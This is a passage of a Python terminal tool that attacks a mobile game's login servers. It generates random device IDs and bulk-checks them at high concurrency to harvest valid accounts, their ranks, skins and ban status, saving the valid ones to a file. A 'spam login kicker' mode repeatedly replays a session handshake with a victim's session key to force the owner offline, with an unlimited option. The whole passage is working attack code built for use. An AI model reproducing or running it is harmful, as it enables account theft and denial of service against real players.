            ban_task = asyncio.create_task(check_ban_v2_async(did))
            
            if gs_info:
                gs_host, gs_port = gs_info
                pd_raw, role_info = await _get_player_info(acc, skey, zone, did, gs_host, gs_port)
                if pd_raw:
                    player_data = extract_player_data(pd_raw, role_info=role_info, creation_ts=creation_ts)
            
            ban_result = await ban_task
            
            result = {'did': did, 'acc': acc, 'zone': zone, 'player': player_data, 'account_info': account_info}
            
            if ban_result:
                result['ban_info'] = {
                    'status': ban_result.get('status', 'UNKNOWN'),
                    'ban_code': ban_result.get('ban_code'),
                    'reason': ban_result.get('reason'),
                    'duration': ban_result.get('duration'),
                }
            else:
                result['ban_info'] = {'status': 'UNKNOWN'}
            
            return result
        except Exception:
            return None
        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

async def _check_with_ban_single(did: str) -> Optional[dict]:
    writer = None
    try:
        frame = _login_frame(did)
        r, w = await asyncio.wait_for(asyncio.open_connection(LOGIN_HOST, LOGIN_PORT), timeout=CONN_TO)
        writer = w
        w.write(frame)
        await asyncio.wait_for(w.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 2:
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        acc = inner.get(0)
        if not acc:
            return None
        skey = inner.get(1, '')
        creation_ts = inner.get(19, 0)
        zr = inner.get(2)
        if isinstance(zr, list):
            zones = [z for z in zr if isinstance(z, int)] if zr else [0]
        elif isinstance(zr, dict):
            zones = [zr.get(0, 0)]
        elif isinstance(zr, int):
            zones = [zr]
        else:
            zones = [0]
        zone = zones[0] if zones else 0
        
        result = {
            'did': did, 'acc': acc, 'zone': zone,
            'session_key': skey,
            'creation_ts': creation_ts,
            'account_info': {'session': skey},
            'player': None,
            'ban_info': {'status': 'UNKNOWN'},
        }
        
        gs_info = await _get_game_server(acc, skey, zone, w, r)
        if gs_info:
            gs_host, gs_port = gs_info
            result['gs_host'] = gs_host
            result['gs_port'] = gs_port
            pd_raw, role_info = await _get_player_info(acc, skey, zone, did, gs_host, gs_port)
            if pd_raw:
                result['player'] = extract_player_data(pd_raw, role_info=role_info, creation_ts=creation_ts)
        
        return result
    except Exception:
        return None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


def fetch_session_profile(device_id: str) -> Optional[dict]:
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(_check_with_ban_single(device_id))
        finally:
            loop.close()
        
        if not result or not result.get('acc'):
            return None
        
        player = result.get('player') or {}
        
        return {
            'device_id': device_id,
            'account_id': result['acc'],
            'session_key': result.get('session_key', ''),
            'zone_id': result['zone'],
            'creation_ts': result.get('creation_ts', 0),
            'game_host': result.get('gs_host'),
            'game_port': result.get('gs_port'),
            'gs_info': f"{result.get('gs_host')}:{result.get('gs_port')}" if result.get('gs_host') else "N/A",
            'nickname': player.get('nickname', 'Unknown'),
            'level': player.get('level', 1),
            'rank': player.get('current_rank', 'Unranked'),
            'highest_rank': player.get('high_rank', 'Unranked'),
            'skin_count': player.get('skin_count', 0),
            'hero_count': player.get('hero_count', 0),
            'ban_status': result.get('ban_info', {}).get('status', 'UNKNOWN'),
        }
    except Exception:
        return None


def send_session_kick(profile: dict, timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        if not profile.get('game_host') or not profile.get('game_port'):
            return False, 0, "No game server info"
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        
        body_struct = SDP({
            0: profile['account_id'],
            1: profile['session_key'],
            2: profile['zone_id'],
            4: CLI_VER,
            13: CHANNEL,
            15: profile['device_id']
        }).data
        
        pkt = SDP({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)
        
        q = b''
        got_ack = False
        while len(q) < 4:
            d = sock.recv(4096)
            if not d:
                break
            q += d
            
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d:
                    break
                q += d
            if len(q) >= sz:
                got_ack = True
                
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try:
                sock.close()
            except:
                pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try:
                sock.close()
            except:
                pass
        return False, elapsed_ms, str(e)


def print_profile_card(data: dict):
    p('')
    p(f' {gtop(V1, V2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}ACCOUNT PROFILE{W}', V1, V2)}")
    p(f' {gmid(V1, V2)}')
    
    acc_id = str(data.get("account_id", "N/A"))
    zone_id = str(data.get("zone_id", "N/A"))
    nick = str(data.get("nickname", "N/A"))
    lvl = str(data.get("level", "N/A"))
    rank = str(data.get("rank", "N/A"))
    high_rank = str(data.get("highest_rank", "N/A"))
    skin_cnt = str(data.get("skin_count", 0))
    hero_cnt = str(data.get("hero_count", 0))
    gs_info = str(data.get("gs_info", "N/A"))
    ban_status = str(data.get("ban_status", "UNKNOWN"))
    
    ban_color = RED if ban_status == 'BANNED' else GREEN if ban_status == 'NOT BANNED' else GOLD
    
    p(f" {grow(f'{c(GRAY)}Account ID{W}   {c(WHITE)}{acc_id}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Zone ID{W}      {c(WHITE)}{zone_id}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Nickname{W}     {c(GREEN)}{nick}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Level{W}        {c(WHITE)}{lvl}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Rank{W}         {c(WHITE)}{rank}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Highest Rank{W} {c(WHITE)}{high_rank}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Skins{W}        {c(WHITE)}{skin_cnt}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Heroes{W}       {c(WHITE)}{hero_cnt}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Game Server{W}  {c(CYAN)}{gs_info}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Ban Status{W}   {c(ban_color)}{ban_status}{W}', V1, V2)}")
    p(f' {gbot(V1, V2)}')
    p('')


def run_bruteforce_login():
    clear()
    print_banner()
    
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}BRUTEFORCE / SPAM LOGIN KICKER{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Enter Device ID to verify and spam login kick.{W}')}")
    p(f' {gbot()}')
    p('')
    
    target_device = input(f' {c(CYAN)}Device ID (0 = Back)>{W} ').strip()
    if not target_device or target_device in ('0', 'q', 'exit', 'back'):
        return
    
    p(f'\n {c(GRAY)}[*] Verifying Device ID & Account Target...{W}')
    profile = fetch_session_profile(target_device)
    
    if not profile:
        p(f'\n {c(RED)}Invalid Device ID, dead, or login failed!{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    clear()
    print_banner()
    print_profile_card(profile)
    
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}KICKER CONFIGURATION{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GOLD)}[1]{W} Single Test (One Kick)', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[2]{W} 10x Login Kick (Standard)', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[3]{W} 50x Login Kick (Fast)', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[4]{W} 100x Login Kick (Aggressive)', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[5]{W} Unlimited (Infinite until stopped)', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[6]{W} Custom (Set loop count & delay)', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}[0]{W} Back', V1, V2)}")
    p(f' {gbot()}')
    p('')
    
    mode_ch = input(f' {c(CYAN)}Choose mode (0-6, Enter=1)>{W} ').strip()
    if mode_ch == '0':
        return
    
    if mode_ch in ('', '1'):
        p(f'\n {c(CYAN)}[*] Sending Session Handshake to {profile.get("gs_info", "N/A")}...{W}')
        success, latency_ms, status_desc = send_session_kick(profile)
        
        if success:
            p(f' {c(GREEN)}[SUCCESS] Session connected & kicked other sessions!{W}')
            p(f'    - Status : {c(GOLD)}{status_desc}{W}')
            p(f'    - Latency: {c(GOLD)}{latency_ms:.1f} ms{W}')
            p(f'    - Server : {c(CYAN)}{profile.get("gs_info", "N/A")}{W}')
        else:
            p(f' {c(RED)}[FAILED] Session failed: {status_desc} ({latency_ms:.1f} ms){W}')
            
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    total_loops = 10
    delay_sec = 2.0
    
    if mode_ch == '2':
        total_loops = 10
        delay_sec = 2.0
    elif mode_ch == '3':
        total_loops = 50
        delay_sec = 1.0
    elif mode_ch == '4':
        total_loops = 100
        delay_sec = 0.5
    elif mode_ch == '5':
        total_loops = 0
        delay_sec = 0.0
    elif mode_ch == '6':
        try:
            raw_loops = input(f' {c(CYAN)}Number of loops (0=unlimited, default=10)>{W} ').strip() or "10"
            total_loops = int(raw_loops)
            raw_delay = input(f' {c(CYAN)}Delay in seconds (default=2.0)>{W} ').strip() or "2.0"
            delay_sec = float(raw_delay)
        except:
            total_loops = 10
            delay_sec = 2.0
    
    loop_label = f"{total_loops:,} Loops" if total_loops > 0 else "Unlimited"
    p(f'\n {c(GOLD)}Starting spam login kicker ({loop_label} | Delay {delay_sec}s)...{W}')
    p(f' {c(GRAY)}Press Ctrl+C anytime to stop.{W}\n')
    
    count = 0
    success_count = 0
    fail_count = 0
    latencies = []
    start_time = time.time()
    
    try:
        while True:
            count += 1
            ok, lat, desc = send_session_kick(profile)
            latencies.append(lat)
            cur_time = datetime.now(TZ_WIB).strftime('%H:%M:%S')
            
            loop_str = f"{count}/{total_loops}" if total_loops > 0 else f"{count}/inf"
            if ok:
                success_count += 1
                status_msg = f"{c(GREEN)}[OK]{W}"
            else:
                fail_count += 1
                status_msg = f"{c(RED)}[XX]{W}"
            
            sys.stdout.write(f'\r {c(GRAY)}[{cur_time}]{W} {status_msg} Loop {c(GOLD)}{loop_str}{W} | Lat: {c(CYAN)}{lat:.0f}ms{W} | OK: {c(GREEN)}{success_count}{W} | Fail: {c(RED)}{fail_count}{W}  ')
            sys.stdout.flush()
            
            if total_loops > 0 and count >= total_loops:
                break
                
            if delay_sec > 0:
                time.sleep(delay_sec)
                
    except KeyboardInterrupt:
        p(f'\n\n {c(GOLD)}Stopped by user.{W}')
    
    duration = time.time() - start_time
    avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
    succ_pct = (success_count / count * 100) if count > 0 else 0.0
    speed = (count / duration) if duration > 0 else 0.0
    
    p('')
    p(f' {gtop(V1, V2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}BRUTEFORCE SUMMARY{W}', V1, V2)}")
    p(f' {gmid(V1, V2)}')
    
    nick_str = str(profile.get("nickname", "N/A"))
    acc_str = str(profile.get("account_id", "N/A"))
    dur_str = fmt_dur(duration)
    count_str = f"{count:,}"
    success_str = f"{success_count:,}"
    fail_str = f"{fail_count:,}"
    
    p(f" {grow(f'{c(GRAY)}Target{W}      {c(GOLD)}{nick_str} (ID: {acc_str}){W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Duration{W}    {c(WHITE)}{dur_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GRAY)}Attempts{W}    {c(WHITE)}{count_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GREEN)}Success{W}     {c(WHITE)}{success_str} ({succ_pct:.1f}%){W}', V1, V2)}")
    p(f" {grow(f'{c(RED)}Failed{W}      {c(WHITE)}{fail_str}{W}', V1, V2)}")
    p(f" {grow(f'{c(GOLD)}Avg Latency{W} {c(WHITE)}{avg_lat:.1f} ms | Speed: {speed:.2f} kick/s{W}', V1, V2)}")
    p(f' {gbot(V1, V2)}')
    p('')
    
    input(f' {c(CYAN)}Press Enter to continue...{W}')

def run_single_check():
    clear()
    print_banner()
    
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}SINGLE DEVICE ID CHECK{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Enter a Device ID to check with full details.{W}')}")
    p(f' {gbot()}')
    p('')
    
    device_id = input(f' {c(CYAN)}Device ID (0 = Back)>{W} ').strip()
    if not device_id or device_id in ('0', 'q', 'exit', 'back'):
        return
    
    p(f'\n {c(GRAY)}[*] Checking device ID...{W}\n')
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(_check_with_ban_single(device_id))
        finally:
            loop.close()
    except Exception as e:
        p(f' {c(RED)}Error: {e}{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    if not result:
        p(f' {c(RED)}Login failed! Device ID invalid or dead.{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    
    acc = result.get('acc')
    zone = result.get('zone')
    player = result.get('player')
    ban_info = result.get('ban_info', {})
    
    p(f' {c(GREEN)}Login successful! Account ID: {acc}, Zone: {zone}{W}\n')
    
    if player:
        nick = str(player.get("nickname", "N/A"))
        lvl = str(player.get("level", "N/A"))
        rank = str(player.get("current_rank", "N/A"))
        high_rank = str(player.get("high_rank", "N/A"))
        skin_cnt = str(player.get("skin_count", 0))
        hero_cnt = str(player.get("hero_count", 0))
        battles = str(player.get("total_battles", 0))
        wr = str(player.get("win_rate", "N/A"))
        coll = str(player.get("collector_tier", "N/A"))
        followers = str(player.get("followers", 0))
        likes = str(player.get("likes", 0))
        last_hero = str(player.get("last_hero", "N/A"))
        creation = str(player.get("creation_date", "N/A"))
        creation_age = str(player.get("creation_age", "N/A"))
        
        p(f' {gtop(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}ACCOUNT DETAILS{W}', V1, V2)}")
        p(f' {gmid(V1, V2)}')
        p(f" {grow(f'{c(GRAY)}Device ID{W}     {c(GOLD)}{device_id}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Account{W}       {c(WHITE)}{acc} ({zone}){W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Nickname{W}      {c(GREEN)}{nick}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Level{W}         {c(WHITE)}{lvl}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Rank{W}          {c(WHITE)}{rank}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Highest Rank{W}  {c(WHITE)}{high_rank}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Skins{W}         {c(WHITE)}{skin_cnt}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Heroes{W}        {c(WHITE)}{hero_cnt}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Battles{W}       {c(WHITE)}{battles}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Win Rate{W}      {c(WHITE)}{wr}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Collector{W}     {c(WHITE)}{coll}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Followers{W}     {c(WHITE)}{followers}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Likes{W}         {c(WHITE)}{likes}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Last Hero{W}     {c(WHITE)}{last_hero}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Created{W}       {c(GOLD)}{creation}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Account Age{W}   {c(GOLD)}{creation_age}{W}', V1, V2)}")
        
        ban_status = ban_info.get('status', 'UNKNOWN')
        ban_color = RED if ban_status == 'BANNED' else GREEN if ban_status == 'NOT BANNED' else GOLD
        p(f' {gdash(V1, V2)}')
        p(f" {grow(f'{c(GRAY)}Ban Status{W}    {c(ban_color)}{ban_status}{W}', V1, V2)}")
        if ban_status == 'BANNED':
            ban_reason = str(ban_info.get("reason", "N/A"))
            ban_dur = str(ban_info.get("duration", "N/A"))
            p(f" {grow(f'{c(GRAY)}Ban Reason{W}    {c(RED)}{ban_reason}{W}', V1, V2)}")
            p(f" {grow(f'{c(GRAY)}Duration{W}      {c(RED)}{ban_dur}{W}', V1, V2)}")
        p(f' {gbot(V1, V2)}')
    else:
        p(f' {c(GOLD)}Account info not available (possibly banned or unregistered){W}')
        
        ban_status = ban_info.get('status', 'UNKNOWN')
        ban_color = RED if ban_status == 'BANNED' else GREEN if ban_status == 'NOT BANNED' else GOLD
        p(f' {gtop(V1, V2)}')
        p(f" {gtitle(f'{c(WHITE)}{BD}ACCOUNT STATUS{W}', V1, V2)}")
        p(f' {gmid(V1, V2)}')
        p(f" {grow(f'{c(GRAY)}Device ID{W}     {c(GOLD)}{device_id}{W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Account{W}       {c(WHITE)}{acc} ({zone}){W}', V1, V2)}")
        p(f" {grow(f'{c(GRAY)}Ban Status{W}    {c(ban_color)}{ban_status}{W}', V1, V2)}")
        if ban_status == 'BANNED':
            ban_reason = str(ban_info.get("reason", "N/A"))
            p(f" {grow(f'{c(GRAY)}Ban Reason{W}    {c(RED)}{ban_reason}{W}', V1, V2)}")
        p(f' {gbot(V1, V2)}')
    
    p('')
    input(f' {c(CYAN)}Press Enter to continue...{W}')


async def run_check(ids, concurrency, rate, dashboard):
    sem = asyncio.Semaphore(concurrency)
    bucket = _Bucket(rate)
    lock = asyncio.Lock()

    async def worker(did):
        res = await _check_with_ban(did, sem, bucket)
        async with lock:
            if res:
                dashboard.add_result(res)
                save_result(res)
            else:
                dashboard.add_unreg()

    tasks = [asyncio.create_task(worker(did)) for did in ids]
    await asyncio.gather(*tasks, return_exceptions=True)


def run_bulk_check():
    clear()
    print_banner()

    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}BULK DEVICE ID CHECK{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Device ID .txt file path:{W}')}")
    p(f' {gbot()}')
    while True:
        acc_file = input(f' {c(CYAN)}>{W} ').strip()
        if not acc_file:
            p(f' {c(RED)}No file entered.{W}')
            continue
        if acc_file == '0':
            return
        if not os.path.exists(acc_file):
            p(f' {c(RED)}Not found: {acc_file}{W}')
            continue
        break

    ids = _load_pool(acc_file)
    if not ids:
        p(f' {c(RED)}No valid device IDs found in file.{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    p(f' {c(GREEN)}Loaded {c(WHITE)}{len(ids):,}{c(GREEN)} device IDs{W}\n')

    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Concurrency (default 200):{W}')}")
    p(f' {gbot()}')
    while True:
        raw = input(f' {c(CYAN)}>{W} ').strip()
        if not raw:
            concurrency = 200
            break
        try:
            concurrency = max(1, min(1000, int(raw)))
            break
        except ValueError:
            p(f' {c(RED)}Enter a number.{W}')

    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Rate per second (default 20):{W}')}")
    p(f' {gbot()}')
    while True:
        raw = input(f' {c(CYAN)}>{W} ').strip()
        if not raw:
            rate = 20
            break
        try:
            rate = max(1, int(raw))
            break
        except ValueError:
            p(f' {c(RED)}Enter a number.{W}')

    os.makedirs(RESULTS_DIR, exist_ok=True)
    dashboard = LiveDashboard(len(ids), concurrency, rate)

    p('')
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}RUNNING{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Device IDs{W}  {c(WHITE)}{len(ids):,}{W}')}")
    p(f" {grow(f'{c(GRAY)}Concurrency{W} {c(WHITE)}{concurrency}{W}')}")
    p(f" {grow(f'{c(GRAY)}Rate{W}        {c(WHITE)}{rate}/s{W}')}")
    now = datetime.now().strftime('%H:%M:%S')
    p(f" {grow(f'{c(GRAY)}Started{W}    {c(WHITE)}{now}{W}')}")
    p(f" {grow(f'{c(GOLD)}Ctrl+C to stop - valid saves are real-time{W}')}")
    p(f' {gbot()}')
    p('')

    dashboard.start()
    try:
        asyncio.run(run_check(ids, concurrency, rate, dashboard))
    except KeyboardInterrupt:
        p(f'\n\n {c(GOLD)}Stopped by user. All valid accounts were saved in real-time.{W}')
    finally:
        dashboard.stop()

    dashboard.render_summary()


def run_valid_only_check():
    """Fast valid-only bulk check — no ban check, no game server, no player info."""
    clear()
    print_banner()

    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}ONLY VALID CHECK (FAST){W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GREEN)}Ultra fast — skips ban check & game server.{W}')}")
    p(f" {grow(f'{c(GRAY)}Only saves valid Device IDs to results/valid.txt{W}')}")
    p(f' {gbot()}')
    p('')

    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}INPUT{W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Device ID .txt file path (0 = Back):{W}')}")
    p(f' {gbot()}')
    while True:
        acc_file = input(f' {c(CYAN)}>{W} ').strip()
        if not acc_file:
            p(f' {c(RED)}No file entered.{W}')
            continue
        if acc_file == '0':
            return
        if not os.path.exists(acc_file):
            p(f' {c(RED)}Not found: {acc_file}{W}')
            continue
        break

    ids = _load_pool(acc_file)
    if not ids:
        p(f' {c(RED)}No valid device IDs found in file.{W}')
        input(f'\n {c(CYAN)}Press Enter to continue...{W}')
        return
    p(f' {c(GREEN)}Loaded {c(WHITE)}{len(ids):,}{c(GREEN)} device IDs{W}\n')

    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Concurrency (default 500, max 2000):{W}')}")
    p(f' {gbot()}')
    while True:
        raw = input(f' {c(CYAN)}>{W} ').strip()
        if not raw:
            concurrency = 500
            break
        try:
            concurrency = max(1, min(2000, int(raw)))
            break
        except ValueError:
            p(f' {c(RED)}Enter a number.{W}')

    p(f' {gtop()}')
    p(f" {grow(f'{c(GRAY)}Socket timeout seconds (default 4):{W}')}")
    p(f' {gbot()}')
    while True:
        raw = input(f' {c(CYAN)}>{W} ').strip()
        if not raw:
            timeout = 4.0
            break
        try:
            timeout = max(1.0, min(15.0, float(raw)))
            break
        except ValueError:
            p(f' {c(RED)}Enter a number.{W}')

    os.makedirs(RESULTS_DIR, exist_ok=True)
    dashboard = ValidOnlyDashboard(len(ids), concurrency)

    p('')
    p(f' {gtop()}')
    p(f" {gtitle(f'{c(WHITE)}{BD}RUNNING (FAST MODE){W}')}")
    p(f' {gmid()}')
    p(f" {grow(f'{c(GRAY)}Device IDs{W}  {c(WHITE)}{len(ids):,}{W}')}")
    p(f" {grow(f'{c(GRAY)}Concurrency{W} {c(WHITE)}{concurrency}{W}')}")
    p(f" {grow(f'{c(GRAY)}Timeout{W}     {c(WHITE)}{timeout}s{W}')}")
    now = datetime.now().strftime('%H:%M:%S')
    p(f" {grow(f'{c(GRAY)}Started{W}    {c(WHITE)}{now}{W}')}")
    p(f" {grow(f'{c(GOLD)}No ban check, no game server — max speed{W}')}")
    p(f' {gbot()}')
    p('')

    dashboard.start()
    try:
        asyncio.run(_run_valid_only_check(ids, concurrency, dashboard))
    except KeyboardInterrupt:
        p(f'\n\n {c(GOLD)}Stopped by user. Valid Device IDs were saved in real-time.{W}')
    finally:
        dashboard.stop()

    dashboard.render_summary()


def show_main_menu():
    clear()
    print_banner()
    
    p(f' {gtop(A1, A2)}')
    p(f" {gtitle(f'{c(WHITE)}{BD}MAIN MENU{W}', A1, A2)}")
    p(f' {gmid(A1, A2)}')
    p(f" {grow(f'{c(GOLD)}[1]{W} {c(WHITE)}Bulk Check{W}          {c(GRAY)}Check multiple device IDs from file{W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[2]{W} {c(WHITE)}Only Valid Check{W}    {c(GRAY)}FAST - saves only valid IDs (no info){W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[3]{W} {c(WHITE)}Single Check{W}        {c(GRAY)}Check one device ID with full details{W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[4]{W} {c(WHITE)}Bruteforce{W}          {c(GRAY)}Spam login kicker for a device ID{W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[5]{W} {c(WHITE)}Creation Date{W}       {c(GRAY)}Check creation date only (single ID, fast){W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[6]{W} {c(WHITE)}Ban Check Only{W}     {c(GRAY)}Check ban status only (single ID, fast){W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[7]{W} {c(WHITE)}Generate Device IDs{W} {c(GRAY)}Create random and_ / ios_ IDs{W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[8]{W} {c(WHITE)}Separate Accounts{W}   {c(GRAY)}Filter Warrior/Elite or Inactive accounts{W}', A1, A2)}")
    p(f" {grow(f'{c(GOLD)}[0]{W} {c(WHITE)}Exit{W}', A1, A2)}")
    p(f' {gbot(A1, A2)}')
    p('')


def main():
    while True:
        show_main_menu()
        choice = input(f' {c(CYAN)}Choose (0-8)>{W} ').strip()
        
        if choice == '0':
            p(f'\n {c(GREEN)}Goodbye!{W}')
            break
        elif choice == '1':
            run_bulk_check()
        elif choice == '2':
            run_valid_only_check()
        elif choice == '3':
            run_single_check()
        elif choice == '4':
            run_bruteforce_login()
        elif choice == '5':
            run_creation_date_single()
        elif choice == '6':
            run_ban_check_single()
        elif choice == '7':
            run_generator_menu()
        elif choice == '8':
            run_separate_menu()
        else:
            p(f' {c(RED)}Invalid choice.{W}')
            time.sleep(1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        p(f'\n\n {c(GOLD)}Stopped by user.{W}')
    except Exception as e:
        p(f'\n {c(RED)}Error: {e}{W}')
        import traceback
        traceback.print_exc()
